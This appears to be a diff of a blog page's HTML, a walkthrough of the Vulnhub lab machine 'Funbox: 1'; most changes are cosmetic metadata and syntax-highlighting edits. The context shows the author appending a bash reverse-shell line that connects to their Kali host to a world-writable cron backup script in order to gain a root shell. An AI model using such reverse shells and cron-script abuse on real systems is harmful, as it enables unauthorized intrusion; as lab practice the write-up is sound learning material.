@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="generator" content="Hugo 0.85.0 with theme Tranquilpeak 0.4.8-BETA">
 <meta name="author" content="Tiago Tavares">
-<meta name="keywords" content="vulnhub">
+<meta name="keywords" content="vulnhub, cybersecurity, information security, running, hacking, programming, offensive security, red team">
 <meta name="description" content="Funbox: 1 - A Vulnhub vulnerable machine walkthrough.">
 
 
@@ -49,10 +49,10 @@
 
 <meta name="twitter:card" content="summary">
 
-  <meta name="twitter:site" content="@tiagotavares_">
+  <meta name="twitter:site" content="@0xtiago">
 
 
-  <meta name="twitter:creator" content="@tiagotavares_">
+  <meta name="twitter:creator" content="@0xtiago">
 
 
 
@@ -103,7 +103,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     
     
   </head>
@@ -201,7 +200,7 @@ if (!doNotTrack) {
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://github.com/tiagotvrs" target="_blank" rel="noopener">
+      <a class="sidebar-button-link " href="https://github.com/0xtiago" target="_blank" rel="noopener">
     
       <i class="sidebar-button-icon fa fa-lg fa-github"></i>
       
@@ -350,8 +349,8 @@ ________________________________________________
  :: URL              : http://192.168.0.55/FUZZ
  :: Follow redirects : false
  :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
  :: Matcher          : Response status: 200,204,301,302,307,401,403
 ________________________________________________
 
@@ -406,7 +405,7 @@ Password:
 lftp joe@192.168.0.55:~&gt; ls
 -rw-------   <span style="color:#ae81ff">1</span> joe      joe           <span style="color:#ae81ff">998</span> Jul <span style="color:#ae81ff">18</span> 09:49 mbox
 lftp joe@192.168.0.55:~&gt; cat mbox
-From root@funbox  Fri Jun <span style="color:#ae81ff">19</span> 13:12:38 2020
+From root@funbox  Fri Jun <span style="color:#ae81ff">19</span> 13:12:38 <span style="color:#ae81ff">2020</span>
 Return-Path: &lt;root@funbox&gt;
 X-Original-To: joe@funbox
 Delivered-To: joe@funbox
@@ -421,7 +420,7 @@ From: root &lt;root@funbox&gt;
 
 Hi Joe, please tell funny the backupscript is <span style="color:#66d9ef">done</span>.
 
-From root@funbox  Fri Jun <span style="color:#ae81ff">19</span> 13:15:21 2020
+From root@funbox  Fri Jun <span style="color:#ae81ff">19</span> 13:15:21 <span style="color:#ae81ff">2020</span>
 Return-Path: &lt;root@funbox&gt;
 X-Original-To: joe@funbox
 Delivered-To: joe@funbox
@@ -457,7 +456,7 @@ joe@funbox:~$
 </code></pre></div><p>Looking at <code>/home</code> directory, we find the funny user folder, which can be find at <code>/etc/passd</code> file.</p>
 <p>In his folder we have a html.tar file. Lets check it.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">joe@funbox:/home/funny$ ls -la
-total 47608
+total <span style="color:#ae81ff">47608</span>
 drwxr-xr-x <span style="color:#ae81ff">3</span> funny funny     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span> 10:02 .
 drwxr-xr-x <span style="color:#ae81ff">4</span> root  root      <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">19</span> 11:50 ..
 -rwxrwxrwx <span style="color:#ae81ff">1</span> funny funny       <span style="color:#ae81ff">55</span> Jul <span style="color:#ae81ff">18</span> 10:15 .backup.sh
@@ -559,7 +558,7 @@ joe@funbox:/home/funny$ date
 Wed <span style="color:#ae81ff">12</span> Aug <span style="color:#ae81ff">2020</span> 12:48:15 AM UTC
 </code></pre></div><h1 id="-complete">🍻 Complete</h1>
 <p>I appended the following line with a  Python reverse shell in <code>.backup.sh</code> , and wait for one minute with a netcat listening port in Kali (192.168.0.56).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.56/8080 0&gt;&amp;1
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.56/8080 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1597369313/blog/image-20200813221101539_megc0i.png" alt="image-20200813221101539"></p>
 <p>Actually it wasn&rsquo;t every minute, but it was executed every <strong>two minutes</strong> with user <code>funny</code>, and every <strong>five minutes</strong> with <code>root</code> user.</p>
 <p>At the first try I could get root shell, but during the writing of this post and replicating the steps for screenshots, I got <strong>funny</strong> user shell. WTF???? And I stood for a long time until get root shell again.</p>
@@ -676,7 +675,7 @@ chmod +x pspy64
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2020 Tiago Tavares. All Rights Reserved
+    &copy; 2021 Tiago Tavares. All Rights Reserved
   </span>
 </footer>
 
